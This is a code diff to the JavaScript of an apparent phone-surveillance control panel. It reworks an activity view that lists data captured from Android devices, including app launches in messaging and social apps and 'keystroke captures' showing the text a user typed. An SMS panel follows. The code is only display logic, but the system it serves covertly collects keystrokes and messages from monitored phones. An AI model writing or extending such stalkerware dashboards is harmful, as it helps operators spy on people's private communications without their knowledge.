@@ -756,25 +756,108 @@ function updateTabBadges() {
 
 // ─── Activity Panel ───────────────────────────────────────────────────────
 
+// Map known package names/types to icons
+const ACTIVITY_ICONS = {
+    'com.anonchat.app':       '🔒',
+    'com.android.systemui':   '📱',
+    'com.android.launcher':   '🏠',
+    'com.google.android.gm':  '📧',
+    'com.whatsapp':           '💬',
+    'com.instagram.android':  '📷',
+    'com.facebook.katana':    '👥',
+    'com.google.android.youtube': '▶️',
+    'com.android.chrome':     '🌐',
+    'com.google.android.apps.maps': '🗺️',
+    'com.coloros.calculator':  '🔢',
+    'app_launch':             '▶️',
+    'default':                '📱',
+};
+
+function activityIcon(a) {
+    return ACTIVITY_ICONS[a.package_name] || ACTIVITY_ICONS[a.activity_type] || ACTIVITY_ICONS['default'];
+}
+
+function togglePanelDetail(prefix, idx) {
+    const row    = document.getElementById(`${prefix}-row-${idx}`);
+    const detail = document.getElementById(`${prefix}-detail-${idx}`);
+    const arrow  = document.getElementById(`${prefix}-arrow-${idx}`);
+    if (!detail) return;
+    const isOpen = detail.classList.contains('open');
+    detail.classList.toggle('open', !isOpen);
+    row.classList.toggle('expanded', !isOpen);
+    arrow.classList.toggle('open', !isOpen);
+}
+
+function formatFullTime(ts) {
+    if (!ts) return '—';
+    const d = new Date(ts);
+    return d.toLocaleString(undefined, {
+        year: 'numeric', month: 'short', day: 'numeric',
+        hour: '2-digit', minute: '2-digit', second: '2-digit'
+    });
+}
+
+function buildActivityDetail(a) {
+    const fields = [];
+
+    // Highlighted typed-text block for keystroke captures
+    let typedHtml = '';
+    if (a.activity_type === 'text_input' && a.data && a.data.text) {
+        typedHtml = `<div style="margin:0 0 10px;padding:8px 12px;background:#f4f6fb;border-left:3px solid #5b7cfa;border-radius:4px;color:#333;font-size:13px;white-space:pre-wrap;word-break:break-word;">“${escHtml(String(a.data.text).substring(0, 500))}”</div>`;
+    }
+
+    // Always-present fields
+    fields.push({ label: 'Activity Type', value: escHtml(a.activity_type || '—') });
+    fields.push({ label: 'App Name',      value: escHtml(a.app_name || '—') });
+    fields.push({ label: 'Package',       value: escHtml(a.package_name || '—') });
+    fields.push({ label: 'Time',          value: escHtml(formatFullTime(a.timestamp)) });
+
+    // Extra fields from the data blob
+    const data = a.data || {};
+    const knownKeys = new Set(['activity_type', 'app_name', 'package_name', 'timestamp']);
+    Object.entries(data).forEach(([k, v]) => {
+        if (knownKeys.has(k)) return;
+        let display = typeof v === 'object' ? JSON.stringify(v) : String(v);
+        fields.push({ label: k.replace(/_/g, ' '), value: escHtml(display) });
+    });
+
+    const gridHtml = fields.map(f => `
+        <div class="activity-detail-field">
+            <div class="activity-detail-label">${f.label}</div>
+            <div class="activity-detail-value">${f.value}</div>
+        </div>`).join('');
+
+    // Raw data dump if there's anything meaningful
+    let rawHtml = '';
+    if (Object.keys(data).length > 0) {
+        rawHtml = `<div class="activity-data-raw">${escHtml(JSON.stringify(data, null, 2))}</div>`;
+    }
+
+    return `${typedHtml}<div class="activity-detail-grid">${gridHtml}</div>${rawHtml}`;
+}
+
 function renderActivityPanel() {
     const container = document.getElementById('panel-activity');
     if (cachedActivity.length === 0) {
         container.innerHTML = '<div class="empty-state"><div class="empty-icon">📋</div>No activity recorded yet</div>';
         return;
     }
-    container.innerHTML = cachedActivity.map(a => {
-        const typed = a.data && (a.data.text || a.data.body);
-        const isTyped = a.activity_type === 'text_input';
-        const icon = isTyped ? '⌨' : '▶';
-        const label = isTyped ? `Typed in ${a.app_name || a.package_name || 'App'}` : (a.app_name || a.activity_type || 'Activity');
-        return `
+    container.innerHTML = cachedActivity.map((a, idx) => `
         <div class="activity-item">
-            <strong>${icon} ${escHtml(label)}</strong>
-            ${a.package_name ? `<span class="device-tag">${escHtml(a.package_name)}</span>` : ''}
-            <span class="time">${formatTime(a.timestamp)}</span>
-            ${typed ? `<div style="margin-top:4px;padding:6px 10px;background:#f4f6fb;border-left:3px solid #5b7cfa;border-radius:4px;color:#333;font-size:13px;white-space:pre-wrap;word-break:break-word;">“${escHtml(String(typed).substring(0, 300))}”</div>` : ''}
-        </div>`;
-    }).join('');
+            <div class="activity-row" id="act-row-${idx}" onclick="togglePanelDetail('act', ${idx})">
+                <span class="activity-arrow" id="act-arrow-${idx}">▶</span>
+                <div class="activity-app-icon">${activityIcon(a)}</div>
+                <div class="activity-main">
+                    <div class="activity-name">${escHtml(a.activity_type === 'text_input' ? ('⌨ Typed in ' + (a.app_name || a.package_name || 'App')) : (a.app_name || a.activity_type || 'Activity'))}</div>
+                    ${a.package_name ? `<div class="activity-pkg">${escHtml(a.package_name)}</div>` : ''}
+                </div>
+                <span class="activity-time">${formatTime(a.timestamp)}</span>
+            </div>
+            <div class="activity-detail" id="act-detail-${idx}">
+                ${buildActivityDetail(a)}
+            </div>
+        </div>
+    `).join('');
 }
 
 // ─── SMS Panel ────────────────────────────────────────────────────────────
